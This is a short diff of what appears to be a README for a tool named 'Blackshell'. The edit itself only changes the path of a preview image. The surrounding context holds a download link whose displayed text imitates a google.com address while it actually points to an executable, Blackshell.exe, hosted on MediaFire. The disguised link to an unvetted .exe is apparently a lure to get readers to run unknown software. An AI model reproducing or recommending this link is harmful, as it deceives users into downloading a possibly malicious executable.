@@ -14,7 +14,7 @@
 ## Download
 - You can download the tool on [mediafire]([https://google.com/](https://www.mediafire.com/file/80ukf0p8qjfb7tx/Blackshell.exe/file))
 
-![Preview](images/preview.png "Preview")
+![Preview](preview.png "Preview")
 
 ---
 
